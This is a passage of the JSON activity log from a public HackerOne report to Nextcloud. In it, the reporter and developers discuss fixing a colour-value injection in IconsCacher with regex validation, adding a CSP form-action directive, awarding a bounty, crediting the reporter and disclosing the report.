\u003ccode\u003e[0-9a-f]{1,6}\u003c/code\u003e at the very beginning of the function.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-12T12:51:17.871Z","updated_at":"2019-06-12T12:51:17.871Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5146016,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the long delay, we had 2 parental leave issues and another leave sadly covering all 3 of our hackerone users at the same time.\n\nI went for the IconsCacher as a fix location, we check for `[0-9a-f]{3,6}` now and fall back to black in case it doesn't match: https://github.com/nextcloud/server/pull/16021/files\n\nSince I couldn't see any impact due to CSP, I will discuss the reward with my colleagues early next week.","markdown_message":"\u003cp\u003eSorry for the long delay, we had 2 parental leave issues and another leave sadly covering all 3 of our hackerone users at the same time.\u003c/p\u003e\n\n\u003cp\u003eI went for the IconsCacher as a fix location, we check for \u003ccode\u003e[0-9a-f]{3,6}\u003c/code\u003e now and fall back to black in case it doesn\u0026#39;t match: \u003ca title=\"https://github.com/nextcloud/server/pull/16021/files\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fpull%2F16021%2Ffiles\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/pull/16021/files\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSince I couldn\u0026#39;t see any impact due to CSP, I will discuss the reward with my colleagues early next week.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-20T13:28:42.549Z","updated_at":"2019-06-20T13:28:42.549Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5146017,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-20T13:28:50.465Z","updated_at":"2019-06-20T13:28:50.465Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5176146,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree there's no XSS, but rather a spoofing impact. \nHowever, I'd suggest discussing a `form-action` directive in the default CSP in parallel to fixing the injection.","markdown_message":"\u003cp\u003eI agree there\u0026#39;s no XSS, but rather a spoofing impact. \u003cbr\u003e\nHowever, I\u0026#39;d suggest discussing a \u003ccode\u003eform-action\u003c/code\u003e directive in the default CSP in parallel to fixing the injection.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-24T08:27:45.768Z","updated_at":"2019-06-24T08:27:45.768Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5263852,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @nickvergessen: I noticed you fixed this and already backported to 14,15,16 with 16.0.2 released this week.\nCan I ask you to mark this as closed and request this report to be disclosed in public?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/nickvergessen\"\u003e@nickvergessen\u003c/a\u003e: I noticed you fixed this and already backported to 14,15,16 with 16.0.2 released this week.\u003cbr\u003e\nCan I ask you to mark this as closed and request this report to be disclosed in public?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-06T09:34:47.856Z","updated_at":"2019-07-06T09:34:47.856Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5271602,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, I wanted to do this on Thursday, I just forgot.","markdown_message":"\u003cp\u003eYeah, I wanted to do this on Thursday, I just forgot.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-08T07:50:44.423Z","updated_at":"2019-07-08T07:50:44.423Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5271603,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again. This has been resolved in our latest maintenance releases and we're working on the advisories at the moment.\n\nPlease let us know how you'd like to be credited in our official advisory. We require the following information:\n\n- Name / Pseudonym\n- Email address (optional)\n- Website (optional)\n- Company (optional)\n","markdown_message":"\u003cp\u003eThanks a lot for your report again. This has been resolved in our latest maintenance releases and we\u0026#39;re working on the advisories at the moment.\u003c/p\u003e\n\n\u003cp\u003ePlease let us know how you\u0026#39;d like to be credited in our official advisory. We require the following information:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eName / Pseudonym\u003c/li\u003e\n\u003cli\u003eEmail address (optional)\u003c/li\u003e\n\u003cli\u003eWebsite (optional)\u003c/li\u003e\n\u003cli\u003eCompany (optional)\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2019-07-08T07:50:54.634Z","updated_at":"2019-07-08T07:50:54.634Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"freddyb","url":"/freddyb"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5271609,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-08T07:51:08.574Z","updated_at":"2019-07-08T07:51:08.574Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"bounty_amount":"50.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nextcloud","collaborator":{"username":"freddyb","url":"/freddyb"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5325631,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please credit me as [Frederik Braun](https://frederik-braun.com) with the link to https://frederik-braun.com - Thank you!","markdown_message":"\u003cp\u003ePlease credit me as \u003ca href=\"/redirect?url=https%3A%2F%2Ffrederik-braun.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eFrederik Braun\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with the link to \u003ca title=\"https://frederik-braun.com\" href=\"/redirect?url=https%3A%2F%2Ffrederik-braun.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://frederik-braun.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-15T18:32:07.933Z","updated_at":"2019-07-15T18:32:07.933Z","actor":{"username":"freddyb","cleared":false,"url":"/freddyb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/953/99768f6b0690c2f5cb0bf55bea826960f8176e45_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5465246,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi,\n\nTthe advisory is pending internally.\nOnce published a CVE will be requested as well.\n\nRegarding the form-actions this is actually on my list already and it just moved a bit higher. So I'll look into this now.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eTthe advisory is pending internally.\u003cbr\u003e\nOnce published a CVE will be requested as well.\u003c/p\u003e\n\n\u003cp\u003eRegarding the form-actions this is actually on my list already and it just moved a bit higher. So I\u0026#39;ll look into this now.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-30T20:01:03.136Z","updated_at":"2019-07-30T20:01:03.136Z","first_to_agree":true,"actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5465607,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nSo I checked and in the upcoming release we actually set a very strict CSP for all non template responses. So it should be catched then. Never the less I will add form-action support in our CSP.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eSo I checked and in the upcoming release we actually set a very strict CSP for all non template responses. So it should be catched then. Never the less I will add form-action support in our CSP.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-30T21:09:08.496Z","updated_at":"2019-07-30T21:09:08.496Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5465658,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nAh no it does not... default fallback is to allow everything.\nIn any case https://github.com/nextcloud/server/pull/16618 adds it :)\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eAh no it does not... default fallback is to allow everything.\u003cbr\u003e\nIn any case \u003ca title=\"https://github.com/nextcloud/server/pull/16618\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fpull%2F16618\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/pull/16618\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e adds it :)\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-30T21:21:22.708Z","updated_at":"2019-07-30T21:21:22.708Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5693652,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-29T20:01:03.776Z","updated_at":"2019-08-29T20:01:03.776Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}